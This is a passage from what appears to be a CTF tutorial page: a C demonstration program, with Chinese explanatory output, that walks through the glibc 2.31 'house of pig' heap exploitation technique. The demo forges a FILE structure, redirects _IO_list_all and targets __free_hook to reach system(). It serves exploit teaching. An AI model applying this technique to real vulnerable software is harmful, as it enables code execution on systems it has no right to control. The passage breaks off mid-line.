<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a><a class="link"   href="https://github.com/Hornos3/pwnfile" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* string)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;今天我们来学习一下house of pig的利用原理。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig在只能使用calloc进行内存分配的CTF赛题中也有用武之地。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先我们了解一下这种利用方式的基本原理。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本程序运行于ubuntu 20.04, glibc版本为2.31-0ubuntu9.9。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在glibc 2.31下，house of pig需要利用__free__hook。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第一步：获取libc的加载地址及堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;通过puts函数获取libc加载地址，在本libc中其偏移为0x84420。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;libc的加载地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后我们通过分配一个chunk（大小为0x500）来获得一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> chunk_1 = (<span class="type">size_t</span>) <span class="built_in">malloc</span>(<span class="number">0x4F0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;获得堆地址为这个chunk的起始地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, chunk_1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第二步：通过large bin attack或其他方法将__free_hook附近写上一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;为了方便起见，本程序直接对__free_hook附近地址进行修改。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在实际应用中，我们要维护好这个堆地址，在后面的步骤中还会用到。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT, <span class="string">&quot;这里在__free_hook-0x10处写入刚才获得的堆地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1EEE48。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> __free_hook = libc_base + <span class="number">0x1EEE48</span>;</span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;__free_hook的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, __free_hook);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* vuln_1 = (<span class="type">size_t</span>*)(__free_hook - <span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">// ---------- 第一处漏洞利用 ---------- //</span></span><br><span class="line">    *vuln_1 = chunk_1;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;第一处漏洞利用完成，已在__free_hook-0x10处写入堆地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第三步：通过large bin attack或其他方法向_IO_list_all写入一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1ED5A0。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x1ED5A0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;_IO_list_all中原本保存的应该是_IO_2_1_stderr_这个文件结构体实例。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在程序调用exit函数时会对_IO_list_all中的FILE结构体依次进行遍历。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;exit函数的调用链为：exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_flush_all_lockp的函数定义：\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这便是遍历_IO_list_all链中的所有FILE实例。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其中一条if语句的判断条件中会调用_IO_OVERFLOW函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这个函数指的是vtable中overflow那个字段对应的函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;要执行到这个函数，就必须要让前面一个判断条件满足。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这也就是我们伪造FILE结构体时需要注意的地方。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面我们就来修改_IO_list_all的值，用一个chunk地址填充。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> chunk_2 = (<span class="type">size_t</span>) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// ---------- 第二处漏洞利用 ---------- //</span></span><br><span class="line">    *_IO_list_all = chunk_2;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;这个chunk的起始地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, chunk_2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第四步：伪造FILE结构体。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;我们使用第二次分配到的chunk作为假FILE结构体进行构造。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;再次强调注意_IO_flush_all_lockp函数的限定条件。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;if语句的前一个判断条件是两个判断相或，我们只需要满足第一个判断即可：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其中_mode字段的偏移为0xC0，_IO_write_ptr为0x28，_IO_write_base为0x30。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;我们在_mode处填0，在_IO_write_ptr填1，在_IO_write_base填0就可以了。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* fake_FILE = (<span class="type">size_t</span>*) chunk_2;</span><br><span class="line">    fake_FILE[<span class="number">0xC0</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _mode</span></span><br><span class="line">    fake_FILE[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">    fake_FILE[<span class="number">0x28</span> / <span class="number">8</span>] = <span class="number">0xFFFFFFFFFFFF</span>;    <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_FILE[<span class="number">0x30</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _IO_write_base</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;三个字段修改完成。但我们需要修改的可不止这三个字段。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在这个判断条件通过后，我们将会进入overflow函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig的一个重要思想就是让其执行_IO_str_overflow函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这需要我们在vtable中写入_IO_str_jumps的地址，其中保存有这个函数的地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;看一下IDA中的_IO_str_jumps结构体：\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560 qword_1E9560    dq 0                    ; DATA XREF: sub_52C20+49A↑o\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560                                         ; sscanf+B5↑o ...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9568                 dq 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9570                 dq offset sub_93D50\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m__libc_IO_vtables:00000000001E9578                 dq offset _IO_str_overflow\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9580                 dq offset _IO_str_underflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9588                 dq offset _IO_default_uflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9590                 dq offset _IO_str_pbackfail\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9598                 dq offset _IO_default_xsputn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A0                 dq offset _IO_default_xsgetn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A8                 dq offset _IO_str_seekoff\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B0                 dq offset sub_92600\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B8                 dq offset sub_924E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C0                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C8                 dq offset _IO_default_doallocate\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D0                 dq offset sub_937F0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D8                 dq offset sub_93800\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E0                 dq offset sub_937D0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E8                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F0                 dq offset sub_937E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F8                 dq offset sub_93810\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9600                 dq offset sub_93820\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其偏移为0x1E9560。将其填充到vtable字段，偏移为0xD8。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> _IO_str_jumps = libc_base + <span class="number">0x1E9560</span>;</span><br><span class="line">    fake_FILE[<span class="number">0xD8</span> / <span class="number">8</span>] = _IO_str_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后，我们进入_IO_str_overflow函数看看。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strops.c, line 80)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_str_overflow (FILE *fp, int c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int flush_only = c == EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t pos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return flush_only ? 0 : EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m\t  char *new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  char *old_buf = fp-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t old_blen = _IO_blen (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t new_size = 2 * old_blen + 100;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_size &lt; old_blen)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  new_buf = malloc (new_size);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_buf == NULL)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /*\t  __ferror(fp) = 1; */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (old_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      memcpy (new_buf, old_buf, old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      free (old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_IO_buf_base = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  memset (new_buf + old_blen, &#x27;\\0&#x27;, new_size - old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  _IO_setb (fp, new_buf, new_buf + new_size, 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_base = new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (!flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这里会连续调用malloc、memcpy、free函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig想要在这里大做文章。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先需要通过tcache stashing unlink attack或其他方法向tcache中插入__free_hook附近的地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后在运行到此时，首先通过malloc分配出来，然后memcpy将指定位置的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;最后通过free函数执行__free_hook中的内容，这里将__free_hook修改为system函数地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;通过代码我们可以知道，memcpy是将_IO_buf_base（结构体内偏移0x38）地址处的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;而这个复制的原地址是我们可控的，需要我们在伪造的FILE结构体中设置。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这里我们设置这个地址的值为第一个chunk的地址+0x20。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x38</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。之后我们需要注意malloc函数申请的chunk大小，其申请的大小需要经过计算。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;计算方式是：(_IO_buf_end - _IO_buf_base) * 2 + 100。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这要求我们正确设置_IO_buf_end的值。如果使用0x100的tcache进行攻击，则end-base=0x46。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;据此设置_IO_buf_end为第一个chunk的地址+0x20+0x46（结构体内偏移0x40）。\n&quot;</span>);</span><br><span class="line">    <span 